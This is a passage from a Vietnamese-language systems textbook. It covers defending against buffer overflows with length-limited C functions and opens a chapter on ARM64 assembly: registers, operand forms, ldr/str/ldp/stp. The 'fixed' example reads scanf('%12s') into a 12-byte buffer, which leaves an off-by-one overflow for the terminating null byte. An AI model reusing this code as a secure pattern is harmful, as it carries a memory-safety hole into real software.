<div class="table-wrapper"><table><thead><tr><th>Thay vì:</th><th>Hãy dùng:</th></tr></thead><tbody>
<tr><td><code>gets(buf)</code></td><td><code>fgets(buf, 12, stdin)</code></td></tr>
<tr><td><code>scanf(&quot;%s&quot;, buf)</code></td><td><code>scanf(&quot;%12s&quot;, buf)</code></td></tr>
<tr><td><code>strcpy(buf2, buf)</code></td><td><code>strncpy(buf2, buf, 12)</code></td></tr>
<tr><td><code>strcat(buf2, buf)</code></td><td><code>strncat(buf2, buf, 12)</code></td></tr>
<tr><td><code>sprintf(buf, &quot;%d&quot;, num)</code></td><td><code>snprintf(buf, 12, &quot;%d&quot;, num)</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các hàm C với length specifier.</p>
<p>File nhị phân <code>secret2</code> (<a href="C8-IA32/_attachments/secret2.tar.gz">secret2.tar.gz</a>) không còn lỗ hổng buffer overflow. Đây là hàm <code>main</code> của bản nhị phân mới này (<a href="C8-IA32/_attachments/main2.c">main2.c</a>):</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;other.h&quot; //contain secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf(&quot;You win!\n&quot;);
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf(&quot;Enter secret number:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //read guess from user input (fixed!)
    guess = atoi(buf); //convert to an integer

    secret=getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf(&quot;You got it right!\n&quot;);
    }
    else {
        printf(&quot;You are so wrong!\n&quot;);
        return 1; //if incorrect, exit
    }

    printf(&quot;Enter the secret string to win:\n&quot;);
    scanf(&quot;%12s&quot;, buf); //get secret string from user input (fixed!)

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf(&quot;You lose!\n&quot;);
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
</code></pre>
<p>Lưu ý rằng chúng ta đã thêm <strong>length specifier</strong> (chỉ định độ dài) vào tất cả các lời gọi <code>scanf</code>, khiến hàm <code>scanf</code> sẽ dừng đọc dữ liệu từ input sau khi đọc đủ 12 byte đầu tiên. Nhờ đó, chuỗi exploit không còn làm chương trình bị lỗi nữa:</p>
<pre><code>$ ./secret2 &lt; exploit
Enter secret number:
You are so wrong!
$ echo $?
1
</code></pre>
<p>Tất nhiên, bất kỳ ai có kỹ năng <strong>reverse engineering</strong> (kỹ thuật đảo ngược) cơ bản vẫn có thể thắng trò chơi đoán số bằng cách phân tích code assembly. Nếu bạn chưa thử đánh bại chương trình bằng reverse engineering, chúng tôi khuyến khích bạn thử ngay bây giờ.</p>
<h3 id="tài-liệu-tham-khảo-3"><a class="header" href="#tài-liệu-tham-khảo-3">Tài liệu tham khảo</a></h3>
<ol>
<li>
<p>Mohit Kumar. <a href="https://thehackernews.com/2017/06/skype-crash-bug.html">Critical Skype Bug Lets Hackers Remotely Execute Malicious Code</a>. 2017.</p>
</li>
<li>
<p>Tamir Zahavi-Brunner. <a href="https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/">CVE-2017-13253: Buffer overflow in multiple Android DRM services</a>. 2018.</p>
</li>
<li>
<p>Tom Spring. <a href="https://threatpost.com/google-patches-high-severity-browser-bug/128661/">Google Patches 'High Severity' Browser Bug</a>. 2017.</p>
</li>
<li>
<p>Christopher Kelty. <a href="https://limn.it/articles/the-morris-worm/">The Morris Worm</a> Limn Magazine, Issue 1. Issue 1, Systemic Risk. 2011.</p>
</li>
<li>
<p>David Auerbach. <a href="https://nplusonemag.com/issue-19/essays/chat-wars/">Chat Wars: Microsoft vs. AOL</a> NplusOne Magazine, Issue 19. Spring 2014.</p>
</li>
<li>
<p>Aleph One. <a href="http://insecure.org/stf/smashstack.html">Smashing the Stack for Fun and Profit</a>. 1996.</p>
</li>
<li>
<p>DotsAreCool. <a href="https://youtu.be/vAHXK2wut_I">Super Mario World Credit Warp</a> (Nintendo ROP example). 2015.</p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="9-arm-assembly"><a class="header" href="#9-arm-assembly">9. ARM Assembly</a></h2>
<p>Trong chương này, chúng ta sẽ tìm hiểu về kiến trúc <strong>ARM version 8 application profile (ARMv8-A)</strong> với <strong>A64 ISA</strong>, phiên bản ARM ISA mới nhất đang được sử dụng trên tất cả các máy tính ARM chạy hệ điều hành Linux.<br />
Hãy nhớ rằng một <a href="C9-ARM64/../C5-Arch/index.html#_what_von_neumann_knew_computer_architecture">instruction set architecture</a> (ISA — “kiến trúc tập lệnh”) định nghĩa tập hợp các lệnh và cách code hóa nhị phân của một chương trình ở cấp độ máy.</p>
<p>Để chạy được các ví dụ trong chương này, bạn cần có một máy với bộ xử lý ARMv8-A và hệ điều hành 64-bit. Các ví dụ trong chương này được thực hiện trên <strong>Raspberry Pi 3B+</strong> chạy hệ điều hành <strong>Ubuntu Mate 64-bit</strong>. Lưu ý rằng mọi phiên bản Raspberry Pi phát hành từ năm 2016 đều có thể sử dụng A64 ISA. Tuy nhiên, <strong>Raspberry Pi OS</strong> (hệ điều hành mặc định của Raspberry Pi) vẫn là bản 32-bit tại thời điểm viết sách này.</p>
<p>Bạn có thể kiểm tra xem hệ thống của mình đang chạy hệ điều hành 64-bit hay không bằng cách chạy lệnh <code>uname -m</code>. Một hệ điều hành 64-bit sẽ cho kết quả như sau:</p>
<pre><code>$ uname -m
aarch64
</code></pre>
<p>Mặc dù có thể <em>biên dịch</em> (build) các tệp thực thi ARM trên máy Intel bằng <a href="https://developer.arm.com/tools-and-software/open-source-software/developer-tools/gnu-toolchain/gnu-a/downloads">bộ công cụ cross-compilation GNU của ARM</a>, nhưng bạn <strong>không thể</strong> <em>chạy</em> trực tiếp các tệp ARM trên hệ thống x86.<br />
Nếu muốn học ARM assembly trực tiếp trên laptop, bạn có thể thử <a href="https://www.qemu.org/">QEMU</a>, một trình <strong>giả lập</strong> (emulator) hệ thống ARM. Trình giả lập khác với máy ảo ở chỗ nó mô phỏng cả phần cứng của hệ thống khác.</p>
<p>Một lựa chọn khác là sử dụng <a href="https://aws.amazon.com/ec2/instance-types/a1/">EC2 A1 instances</a> mà Amazon mới phát hành. Mỗi instance cung cấp cho bạn quyền truy cập vào bộ xử lý <strong>Graviton 64-bit</strong>, tuân theo đặc tả ARMv8-A.</p>
<p>Tuy nhiên, cần lưu ý rằng các lệnh assembly cụ thể do compiler sinh ra phụ thuộc nhiều vào hệ điều hành và kiến trúc phần cứng chính xác. Do đó, code assembly sinh ra trên AWS hoặc qua QEMU có thể hơi khác so với các ví dụ trong chương này.</p>
<blockquote>
<p><strong>RISC và bộ xử lý ARM</strong></p>
<p>Trong nhiều năm, kiến trúc <strong>CISC</strong> (<em>complex instruction set computer</em>) chiếm ưu thế trên thị trường máy tính cá nhân và máy chủ. Ví dụ phổ biến của CISC là các bộ xử lý Intel và AMD.<br />
Tuy nhiên, kiến trúc <strong>RISC</strong> (<em>reduced instruction set computer</em>) đã phát triển mạnh trong thập kỷ qua nhờ nhu cầu từ lĩnh vực điện toán di động. ARM (viết tắt của <em>Acorn RISC Machine</em>) là một ví dụ của kiến trúc RISC, bên cạnh RISC-V và MIPS.<br />
RISC đặc biệt hấp dẫn đối với điện toán di động nhờ hiệu suất năng lượng cao, giúp kéo dài tuổi thọ pin.<br />
Trong những năm gần đây, ARM và các bộ xử lý RISC khác đã bắt đầu thâm nhập vào thị trường máy chủ và <strong>HPC</strong> (<em>high performance computing</em>). Ví dụ, siêu máy tính <strong>Fugaku</strong> của Nhật Bản — nhanh nhất thế giới vào năm 2020 — sử dụng bộ xử lý ARM.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="91-bắt-đầu-với-assembly-những-điều-cơ-bản-diving-into-assembly-basics"><a class="header" href="#91-bắt-đầu-với-assembly-những-điều-cơ-bản-diving-into-assembly-basics">9.1. Bắt đầu với Assembly: Những điều cơ bản (Diving into Assembly: Basics)</a></h2>
<p>Để có cái nhìn đầu tiên về <strong>assembly</strong>, chúng ta sẽ chỉnh sửa hàm <code>adder</code> từ <a href="C9-ARM64/../C6-asm_intro/index.html#_assembly_chapter">chương giới thiệu về assembly</a> để đơn giản hóa hành vi của nó. Phiên bản đã chỉnh sửa (<code>adder2</code>) được thể hiện dưới đây:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

//adds two to an integer and returns the result
int adder2(int a) {
    return a + 2;
}

int main(void) {
    int x = 40;
    x = adder2(x);
    printf(&quot;x is: %d\n&quot;, x);
    return 0;
}
</code></pre>
<p>Để biên dịch đoạn code này, sử dụng lệnh sau:</p>
<pre><code>$ gcc -o adder adder.c
</code></pre>
<p>Tiếp theo, hãy xem code assembly tương ứng của đoạn code này bằng cách sử dụng lệnh <code>objdump</code>:</p>
<pre><code>$ objdump -d adder &gt; output
$ less output
</code></pre>
<p>Tìm đoạn code liên quan đến hàm <code>adder2</code> bằng cách gõ <code>/adder</code> khi đang xem file <code>output</code> với <code>less</code>. Phần liên quan đến <code>adder</code> sẽ trông tương tự như sau:</p>
<p><strong>Kết quả assembly cho hàm <code>adder2</code></strong>:</p>
<pre><code>0000000000000724 &lt;adder2&gt;:
 724:   d10043ff        sub     sp, sp, #0x10
 728:   b9000fe0        str     w0, [sp, #12]
 72c:   b9400fe0        ldr     w0, [sp, #12]
 730:   11000800        add     w0, w0, #0x2
 734:   910043ff        add     sp, sp, #0x10
 738:   d65f03c0        ret
</code></pre>
<p>Đừng lo nếu bạn chưa hiểu chuyện gì đang diễn ra. Chúng ta sẽ tìm hiểu chi tiết hơn về assembly trong các phần sau. Hiện tại, hãy nghiên cứu cấu trúc của từng lệnh riêng lẻ.</p>
<p>Mỗi dòng trong ví dụ trên bao gồm: địa chỉ 64-bit của lệnh trong bộ nhớ chương trình (được rút gọn xuống 3 chữ số cuối để tiết kiệm không gian), các byte tương ứng với lệnh, và dạng biểu diễn văn bản của chính lệnh đó.<br />
Ví dụ: <code>d10043ff</code> là dạng code máy của lệnh <code>sub sp, sp, #0x10</code>, và lệnh này nằm tại địa chỉ <code>0x724</code> trong bộ nhớ code lệnh. Lưu ý rằng <code>0x724</code> là dạng rút gọn của địa chỉ 64-bit đầy đủ; <code>objdump</code> bỏ các số 0 ở đầu để dễ đọc hơn.</p>
<p>Điều quan trọng cần lưu ý là một dòng code C thường được dịch thành nhiều lệnh assembly.<br />
Ví dụ, phép toán <code>a + 2</code> được biểu diễn bởi ba lệnh tại các địa chỉ <code>0x728</code> đến <code>0x730</code>:<br />
<code>str w0, [sp, #12]</code>, <code>ldr w0, [sp, #12]</code>, và <code>add w0, w0, #0x2</code>.</p>
<blockquote>
<p><strong>Mã assembly của bạn có thể khác!</strong></p>
<p>Nếu bạn biên dịch code cùng với chúng tôi, bạn có thể nhận thấy một số ví dụ assembly của mình trông khác. Các lệnh assembly chính xác mà compiler tạo ra phụ thuộc vào phiên bản compiler, kiến trúc phần cứng cụ thể, và hệ điều hành đang sử dụng.<br />
Hầu hết các ví dụ assembly trong chương này được tạo trên Raspberry Pi 3B+ chạy hệ điều hành Ubuntu Mate 64-bit và sử dụng GCC. Nếu bạn dùng hệ điều hành khác, compiler khác, hoặc một Raspberry Pi hay máy tính nhúng khác, kết quả assembly của bạn có thể khác.</p>
<p>Trong các ví dụ tiếp theo, chúng tôi <strong>không</strong> sử dụng bất kỳ optimization flag hóa nào. Ví dụ, chúng tôi biên dịch bất kỳ file ví dụ nào (ví dụ: <code>example.c</code>) bằng lệnh:<br />
<code>gcc -o example example.c</code></p>
<p>Do đó, sẽ có nhiều lệnh trông như dư thừa trong các ví dụ. Hãy nhớ rằng compiler không “thông minh” — nó chỉ đơn giản tuân theo một loạt quy tắc để dịch code dễ đọc của con người sang ngôn ngữ máy. Trong quá trình dịch này, việc xuất hiện một số lệnh dư thừa là điều bình thường.<br />
Các compiler tối ưu hóa sẽ loại bỏ nhiều lệnh dư thừa này trong quá trình tối ưu, nội dung này sẽ được đề cập ở <a href="C9-ARM64/../C12-CodeOpt/index.html#_code_optimization">chương sau</a>.</p>
</blockquote>
<h3 id="911-thanh-ghi-registers"><a class="header" href="#911-thanh-ghi-registers">9.1.1. Thanh ghi (Registers)</a></h3>
<p>Hãy nhớ rằng <strong>register</strong> (thanh ghi) là một đơn vị lưu trữ có kích thước bằng một từ (word-sized) nằm trực tiếp trên CPU. CPU ARMv8 có tổng cộng 31 thanh ghi dùng để lưu trữ dữ liệu 64-bit đa dụng: từ <code>x0</code> đến <code>x30</code>. Một chương trình có thể diễn giải nội dung của một thanh ghi như số nguyên hoặc như địa chỉ, nhưng bản thân thanh ghi thì không phân biệt. Chương trình có thể đọc hoặc ghi vào cả 31 thanh ghi này.</p>
<p><strong>ARMv8-A ISA</strong> (Instruction Set Architecture — “kiến trúc tập lệnh”) cũng định nghĩa các thanh ghi chuyên dụng. Hai thanh ghi đầu tiên đáng chú ý là <strong>stack pointer</strong> (<code>sp</code>) và <strong>program counter</strong> (<code>pc</code>). Compiler dành thanh ghi <code>sp</code> để quản lý bố cục của <em>program stack</em> (ngăn xếp chương trình). Thanh ghi <code>pc</code> trỏ tới lệnh tiếp theo sẽ được CPU thực thi; khác với các thanh ghi khác, chương trình không thể ghi trực tiếp vào <code>pc</code>. Tiếp theo, <strong>zero register</strong> <code>zr</code> luôn lưu giá trị 0 và chỉ hữu ích khi dùng làm thanh ghi nguồn.</p>
<h3 id="912-ký-hiệu-nâng-cao-của-thanh-ghi-advanced-register-notation"><a class="header" href="#912-ký-hiệu-nâng-cao-của-thanh-ghi-advanced-register-notation">9.1.2. Ký hiệu nâng cao của thanh ghi (Advanced Register Notation)</a></h3>
<p>Vì ARMv8-A là phần mở rộng của kiến trúc ARMv7-A 32-bit, <strong>A64 ISA</strong> cung cấp cơ chế truy cập 32 bit thấp hơn của mỗi thanh ghi đa dụng, ký hiệu từ <code>w0</code> đến <code>w30</code>. <a href="C9-ARM64/basics.html#Registera64">Hình 1</a> minh họa bố cục của thanh ghi <code>x0</code>. Nếu dữ liệu 32-bit được lưu trong <em>component register</em> <code>w0</code>, thì 32 bit cao hơn của thanh ghi sẽ không thể truy cập được và bị đặt về 0.</p>
<p><img src="C9-ARM64/_images/register.png" alt="32-bit component register w0 and its relation to the 64-bit x0 register" /></p>
<p><strong>Hình 1.</strong> Bố cục <em>component register</em> của thanh ghi <code>%x0</code>.</p>
<blockquote>
<p><strong>Compiler có thể chọn <em>component register</em> tùy theo kiểu dữ liệu</strong></p>
<p>Khi đọc code assembly, hãy nhớ rằng compiler thường sử dụng thanh ghi 64-bit khi làm việc với giá trị 64-bit (ví dụ: con trỏ hoặc kiểu <code>long</code>) và sử dụng <em>component register</em> 32-bit khi làm việc với giá trị 32-bit (ví dụ: kiểu <code>int</code>).<br />
Trong A64, việc xen kẽ giữa <em>component register</em> 32-bit và thanh ghi đầy đủ 64-bit là rất phổ biến. Ví dụ, trong hàm <code>adder2</code> đã trình bày trước đó, compiler tham chiếu tới <em>component register</em> <code>w0</code> thay vì <code>x0</code> vì kiểu <code>int</code> thường chiếm 32 bit (4 byte) trên hệ thống 64-bit. Nếu hàm <code>adder2</code> có tham số kiểu <code>long</code> thay vì <code>int</code>, compiler sẽ lưu <code>a</code> trong thanh ghi <code>x0</code> thay vì <em>component register</em> <code>w0</code>.</p>
</blockquote>
<p>Đối với những người đã quen với <strong>A32 ISA</strong>, cần lưu ý rằng các thanh ghi đa dụng 32-bit <code>r0</code> đến <code>r12</code> trong A32 ISA được ánh xạ sang các <em>component register</em> <code>w0</code> đến <code>w12</code> trong A64. <strong>A64 ISA</strong> tăng hơn gấp đôi số lượng thanh ghi khả dụng so với A32.</p>
<h3 id="913-cấu-trúc-lệnh-instruction-structure"><a class="header" href="#913-cấu-trúc-lệnh-instruction-structure">9.1.3. Cấu trúc lệnh (Instruction Structure)</a></h3>
<p>Mỗi <strong>instruction</strong> (lệnh) bao gồm một <strong>operation code</strong> hay <strong>opcode</strong> (code thao tác) xác định lệnh sẽ làm gì, và một hoặc nhiều <strong>operand</strong> (toán hạng) cho biết cách thực hiện.<br />
Đối với hầu hết các lệnh A64, định dạng thường dùng như sau:</p>
<pre><code>opcode D, O1, O2
</code></pre>
<p>Trong đó:</p>
<ul>
<li><code>opcode</code> là code thao tác.</li>
<li><code>D</code> là <strong>destination register</strong> (thanh ghi đích).</li>
<li><code>O1</code> là toán hạng thứ nhất.</li>
<li><code>O2</code> là toán hạng thứ hai.</li>
</ul>
<p>Ví dụ, lệnh <code>add w0, w0, #0x2</code> có:</p>
<ul>
<li><strong>opcode</strong>: <code>add</code></li>
<li><strong>destination register</strong>: <code>w0</code></li>
<li>Hai toán hạng: <code>w0</code> và <code>#0x2</code>.</li>
</ul>
<p>Có nhiều loại toán hạng khác nhau:</p>
<ul>
<li>
<p><strong>Constant (literal)</strong>: giá trị hằng, được đặt trước bởi dấu <code>#</code>.<br />
Ví dụ: trong lệnh <code>add w0, w0, #0x2</code>, toán hạng <code>#0x2</code> là một giá trị hằng tương ứng với giá trị hexa <code>0x2</code>.</p>
</li>
<li>
<p><strong>Register</strong>: tham chiếu tới một thanh ghi cụ thể.<br />
Ví dụ: lệnh <code>add sp, sp, #0x10</code> sử dụng thanh ghi <strong>stack pointer</strong> <code>sp</code> làm thanh ghi đích và cũng là toán hạng thứ nhất cho lệnh <code>add</code>.</p>
</li>
<li>
<p><strong>Memory</strong>: tham chiếu tới một giá trị trong bộ nhớ chính (RAM), thường dùng để tra cứu địa chỉ.<br />
Dạng địa chỉ bộ nhớ có thể kết hợp thanh ghi và giá trị hằng.<br />
Ví dụ: trong lệnh <code>str w0, [sp, #12]</code>, toán hạng <code>[sp, #12]</code> là một dạng <strong>memory</strong>. Nó có thể hiểu là “cộng 12 vào giá trị trong thanh ghi <code>sp</code>, rồi truy xuất giá trị tại địa chỉ đó trong bộ nhớ”. Nếu điều này nghe giống như <em>pointer dereference</em> (giải tham chiếu con trỏ), thì đúng là như vậy.</p>
</li>
</ul>
<h3 id="914-ví-dụ-với-toán-hạng-an-example-with-operands"><a class="header" href="#914-ví-dụ-với-toán-hạng-an-example-with-operands">9.1.4. Ví dụ với toán hạng (An Example with Operands)</a></h3>
<p>Cách tốt nhất để giải thích chi tiết về toán hạng là đưa ra một ví dụ nhanh.<br />
Giả sử bộ nhớ chứa các giá trị sau:</p>
<div class="table-wrapper"><table><thead><tr><th>Address</th><th>Value</th></tr></thead><tbody>
<tr><td>0x804</td><td>0xCA</td></tr>
<tr><td>0x808</td><td>0xFD</td></tr>
<tr><td>0x80c</td><td>0x12</td></tr>
<tr><td>0x810</td><td>0x1E</td></tr>
</tbody></table>
</div>
<p>Giả sử thêm rằng các thanh ghi chứa giá trị như sau:</p>
<div class="table-wrapper"><table><thead><tr><th>Register</th><th>Value</th></tr></thead><tbody>
<tr><td><code>x0</code></td><td>0x804</td></tr>
<tr><td><code>x1</code></td><td>0xC</td></tr>
<tr><td><code>x2</code></td><td>0x2</td></tr>
<tr><td><code>w3</code></td><td>0x4</td></tr>
</tbody></table>
</div>
<p>Khi đó, các toán hạng trong <strong>Bảng 1</strong> sẽ được đánh giá thành các giá trị tương ứng.<br />
Mỗi dòng trong bảng khớp một toán hạng với dạng của nó (constant, register, memory), cách dịch, và giá trị.</p>
<div class="table-wrapper"><table><thead><tr><th>Operand</th><th>Form</th><th>Translation</th><th>Value</th></tr></thead><tbody>
<tr><td><code>x0</code></td><td>Register</td><td><code>x0</code></td><td>0x804</td></tr>
<tr><td><code>[x0]</code></td><td>Memory</td><td>*(0x804)</td><td>0xCA</td></tr>
<tr><td><code>#0x804</code></td><td>Constant</td><td>0x804</td><td>0x804</td></tr>
<tr><td><code>[x0, #8]</code></td><td>Memory</td><td>*(<code>x0</code> + 8) hoặc *(0x80c)</td><td>0x12</td></tr>
<tr><td><code>[x0, x1]</code></td><td>Memory</td><td>*(<code>x0</code> + <code>x1</code>) hoặc *(0x810)</td><td>0x1E</td></tr>
<tr><td><code>[x0, w3, SXTW]</code></td><td>Memory (Sign-Extend)</td><td>*(<code>x0</code> + SignExtend(<code>w3</code>)) hoặc *(0x808)</td><td>0xFD</td></tr>
<tr><td><code>[x0, x2, LSL, #2]</code></td><td>Scaled Memory</td><td>*(<code>x0</code> + (<code>x2</code> &lt;&lt; 2)) hoặc *(0x80c)</td><td>0x12</td></tr>
<tr><td><code>[x0, w3, SXTW, #1]</code></td><td>Scaled Memory (Sign-Extend)</td><td>*(<code>x0</code> + SignExtend(<code>w3</code> &lt;&lt; 1)) hoặc *(0x80c)</td><td>0x12</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Ví dụ về các toán hạng</p>
<p>Trong Bảng 1:</p>
<ul>
<li><code>x0</code> biểu thị giá trị lưu trong thanh ghi 64-bit <code>x0</code>.</li>
<li><code>w3</code> biểu thị giá trị 32-bit lưu trong <em>component register</em> <code>w3</code>.</li>
<li><code>[x0]</code> nghĩa là giá trị trong <code>x0</code> được coi là một địa chỉ, và thực hiện <em>dereference</em> (truy xuất giá trị tại địa chỉ đó). Do đó, <code>[x0]</code> tương ứng với *(0x804) hay giá trị <code>0xCA</code>.</li>
<li>Một phép toán trên thanh ghi 32-bit có thể kết hợp với thanh ghi 64-bit bằng lệnh <strong>sign-extend word</strong> (<code>SXTW</code>). Ví dụ: <code>[x0, w3, SXTW]</code> sẽ <em>sign-extend</em> <code>w3</code> thành giá trị 64-bit trước khi cộng vào <code>x0</code> và truy xuất bộ nhớ.</li>
<li>Các dạng <strong>scaled memory</strong> cho phép tính toán offset bằng cách dịch trái (left shift).</li>
</ul>
<p>Một số lưu ý quan trọng:</p>
<ul>
<li>Dữ liệu không thể đọc hoặc ghi trực tiếp từ bộ nhớ; ARM tuân theo mô hình <strong>load/store</strong>, yêu cầu dữ liệu phải được nạp vào thanh ghi trước khi thao tác, và ghi trở lại bộ nhớ sau khi hoàn tất.</li>
<li>Thành phần đích (destination) của một lệnh luôn phải là một thanh ghi.</li>
</ul>
<p>Bảng 1 được cung cấp như tài liệu tham khảo; tuy nhiên, việc hiểu rõ các dạng toán hạng chính sẽ giúp bạn đọc nhanh hơn và chính xác hơn khi phân tích code assembly.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="92-các-lệnh-thông-dụng-common-instructions"><a class="header" href="#92-các-lệnh-thông-dụng-common-instructions">9.2. Các lệnh thông dụng (Common Instructions)</a></h2>
<p>Trong phần này, chúng ta sẽ thảo luận về một số lệnh ARM assembly thường gặp. <strong>Bảng 1</strong> liệt kê các lệnh nền tảng nhất trong ARM assembly.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>ldr D, [addr]</code></td><td>D = *(addr) (nạp giá trị trong bộ nhớ vào thanh ghi D)</td></tr>
<tr><td><code>str S, [addr]</code></td><td>*(addr) = S (lưu giá trị S vào vị trí bộ nhớ *(addr))</td></tr>
<tr><td><code>mov D, S</code></td><td>D = S (sao chép giá trị của S vào D)</td></tr>
<tr><td><code>add D, O1, O2</code></td><td>D = O1 + O2 (cộng O1 với O2 và lưu kết quả vào D)</td></tr>
<tr><td><code>sub D, O1, O2</code></td><td>D = O1 - O2 (lấy O1 trừ O2 và lưu kết quả vào D)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh thông dụng nhất</p>
<p>Vì vậy, chuỗi lệnh:</p>
<pre><code>str     w0, [sp, #12]
ldr     w0, [sp, #12]
add     w0, w0, #0x2
</code></pre>
<p>được dịch như sau:</p>
<ul>
<li>Lưu giá trị trong thanh ghi <code>w0</code> vào vị trí <em>bộ nhớ</em> được chỉ định bởi <code>sp + 12</code> (hay <code>*(sp + 12)</code>).</li>
<li>Nạp giá trị <em>từ</em> vị trí bộ nhớ <code>sp + 12</code> (hay <code>*(sp + 12)</code>) vào thanh ghi <code>w0</code>.</li>
<li>Cộng giá trị <code>0x2</code> vào thanh ghi <code>w0</code> và lưu kết quả vào <code>w0</code> (hay <code>w0 = w0 + 0x2</code>).</li>
</ul>
<p>Các lệnh <code>add</code> và <code>sub</code> trong <strong>Bảng 1</strong> cũng hỗ trợ việc duy trì tổ chức của <strong>program stack</strong> (hay <strong>call stack</strong>). Hãy nhớ rằng <strong>stack pointer</strong> (<code>sp</code>) được compiler dành riêng để quản lý call stack. Như đã đề cập trong phần <a href="C9-ARM64/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>, call stack thường lưu trữ các biến cục bộ và tham số, đồng thời giúp chương trình theo dõi quá trình thực thi của chính nó (xem <strong>Hình 1</strong>). Trên các hệ thống ARM, execution stack phát triển về phía <em>địa chỉ thấp hơn</em>. Giống như mọi cấu trúc dữ liệu stack, các thao tác diễn ra ở “đỉnh” của call stack; do đó <code>sp</code> “trỏ” tới đỉnh stack, và giá trị của nó là địa chỉ của đỉnh stack.</p>
<p><img src="C9-ARM64/_images/memparts.png" alt="The parts of a program's address space." /></p>
<p><strong>Hình 1.</strong> Các phần của không gian địa chỉ của một chương trình</p>
<p>Các lệnh <code>ldp</code> và <code>stp</code> trong <strong>Bảng 2</strong> hỗ trợ di chuyển nhiều vị trí bộ nhớ cùng lúc, thường là đưa dữ liệu vào hoặc ra khỏi program stack. Trong <strong>Bảng 2</strong>, thanh ghi <code>x0</code> chứa một địa chỉ bộ nhớ.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>ldp D1, D2, [x0]</code></td><td>D1 = *(x0), D2 = *(x0+8) (nạp giá trị tại x0 và x0+8 vào các thanh ghi D1 và D2)</td></tr>
<tr><td><code>ldp D1, D2, [x0, #0x10]!</code></td><td>x0 = x0 + 0x10, <em>sau đó</em> D1 = *(x0), D2 = *(x0+8)</td></tr>
<tr><td><code>ldp D1, D2, [x0], #0x10</code></td><td>D1 = *(x0), D2 = *(x0+8), <em>sau đó</em> x0 = x0 + 0x10</td></tr>
<tr><td><code>stp S1, S2, [x0]</code></td><td>*(x0) = S1, *(x0+8) = S2 (lưu S1 và S2 vào các vị trí *(x0) và *(x0+8))</td></tr>
<tr><td><code>stp S1, S2, [x0, #-16]!</code></td><td>x0 = x0 - 16, <em>sau đó</em> *(x0) = S1, *(x0+8) = S2</td></tr>
<tr><td><code>stp S1, S2, [x0], #-16</code></td><td>*(x0) = S1, *(x0+8) = S2, <em>sau đó</em> x0 = x0 - 16</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Một số lệnh truy cập nhiều vị trí bộ nhớ</p>
<p>Tóm lại, lệnh <code>ldp</code> nạp một cặp giá trị từ địa chỉ trong thanh ghi <code>x0</code> và từ địa chỉ <code>x0 + 0x8</code> vào các thanh ghi đích D1 và D2. Ngược lại, lệnh <code>stp</code> lưu cặp giá trị từ các thanh ghi nguồn S1 và S2 vào địa chỉ trong <code>x0</code> và <code>x0 + 0x8</code>. Giả định ở đây là các giá trị trong thanh ghi có kích thước 64-bit. Nếu dùng thanh ghi 32-bit, các offset bộ nhớ sẽ là <code>x0</code> và <code>x0 + 0x4</code>.</p>
<p>Ngoài ra, <code>ldp</code> và <code>stp</code> còn có hai dạng đặc biệt cho phép cập nhật <code>x0</code> đồng thời. Ví dụ, lệnh <code>stp S1, S2, [x0, #-16]!</code> nghĩa là trước tiên trừ <code>x0</code> đi 16 byte, sau đó lưu S1 và S2 vào <code>[x0]</code> và <code>[x0+0x8]</code>. Ngược lại, lệnh <code>ldp D1, D2, [x0], #0x10</code> nghĩa là trước tiên nạp giá trị tại <code>[x0]</code> và <code>[x0+8]</code> vào D1 và D2, rồi cộng thêm 16 byte vào <code>x0</code>. Các dạng đặc biệt này thường được dùng ở phần đầu và cuối của các hàm có nhiều lời gọi hàm khác, như chúng ta sẽ thấy <a href="C9-ARM64/functions.html#_tracing_through_an_example">sau này</a>.</p>
<h3 id="921-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn"><a class="header" href="#921-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn">9.2.1. Kết hợp tất cả: Một ví dụ cụ thể hơn</a></h3>
<p>Hãy xem xét kỹ hơn hàm <code>adder2</code>:</p>
<pre><code class="language-c">//adds two to an integer and returns the result
int adder2(int a) {
    return a + 2;
}
</code></pre>
<p>Và code assembly tương ứng:</p>
<pre><code>0000000000000724 &lt;adder2&gt;:
 724:   d10043ff        sub     sp, sp, #0x10
 728:   b9000fe0        str     w0, [sp, #12]
 72c:   b9400fe0        ldr     w0, [sp, #12]
 730:   11000800        add     w0, w0, #0x2
 734:   910043ff        add     sp, sp, #0x10
 738:   d65f03c0        ret
</code></pre>
<p>Mã assembly bao gồm một lệnh <code>sub</code>, tiếp theo là các lệnh <code>str</code> và <code>ldr</code>, hai lệnh <code>add</code>, và cuối cùng là một lệnh <code>ret</code>.<br />
Để hiểu cách CPU thực thi tập lệnh này, chúng ta cần xem lại cấu trúc của <a href="C9-ARM64/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>.<br />
